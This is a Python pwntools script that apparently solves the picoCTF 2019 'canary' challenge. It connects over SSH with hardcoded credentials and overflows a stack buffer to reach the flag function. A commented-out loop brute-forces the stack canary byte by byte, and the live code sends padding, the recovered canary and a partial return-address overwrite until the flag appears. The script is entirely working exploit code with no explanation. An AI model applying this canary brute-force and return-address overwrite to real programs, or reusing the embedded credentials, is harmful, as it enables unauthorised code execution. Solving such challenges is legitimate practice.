from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

addressOfFlagFxn = b'\xed\x07\x00\x00'
addr = '\xed\x07\x00\x00'

canary = 'LjgH'
# for length in range(33, 37):
#     for i in range(0, 256):
#         program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
#         program.recvline()
#         program.recv()
#         program.sendline(str(length))
#         program.recv()
#         program.sendline('a' * 32 + canary + chr(i))
#         output = program.recvline()
#         if b'Canary' not in output:
#             print(output)
#             canary += chr(i)
#             break

payload = 'a' * 32 + canary + 'a' * 16 + '\xed\x07\x00\x00'
strlenOfPayload = str(len(payload))
while True:
    program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')

    program.sendlineafter('> ', strlenOfPayload)
    program.sendlineafter('> ', payload)

    data = program.recvall()
    if b'pico' in data:
        print(data)
        break
